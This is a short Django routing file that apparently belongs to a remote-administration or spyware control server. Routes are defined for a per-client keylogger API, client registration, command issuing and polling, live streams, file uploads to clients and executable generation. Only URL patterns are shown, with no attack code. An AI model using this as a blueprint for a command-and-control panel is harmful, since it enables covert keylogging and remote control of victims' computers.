# chat/urls.py
from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='index'),
    path('cmd/<str:client_id>/', views.cmd_page, name='cmd_page'),
    path('generate-exe/', views.generate_exe, name='generate_exe'),
    path('download_file', views.download_zero, name='download_device'),
    path('upload-file/<str:client_id>/', views.upload_file, name='upload_file'),
    path('update-client-name/<str:client_id>/', views.update_client_name, name='update_client_name'),

    # API URLs
    path('api/keylogger/<str:client_id>/', views.KeyloggerView.as_view(), name='keylogger'),
    path('api/register/', views.ClientRegisterView.as_view(), name='client_register'),
    path('api/command/<str:client_id>/', views.ClientCommandView.as_view(), name='client_command'),
    path('api/poll/<str:client_id>/', views.ClientPollView.as_view(), name='client_poll'),
    path('api/stream/<str:client_id>/<str:stream_type>/', views.StreamView.as_view(), name='stream'),
    path('api/activities/<str:client_id>/', views.ClientActivitiesView.as_view(), name='client_activities'),
    path('api/notifications/', views.NotificationsView.as_view(), name='all_notifications'),
    path('api/notifications/<str:client_id>/', views.NotificationsView.as_view(), name='client_notifications'),
    path('api/notifications/mark-read/<int:notification_id>/', views.NotificationsView.as_view(), name='mark_notification_read'),
]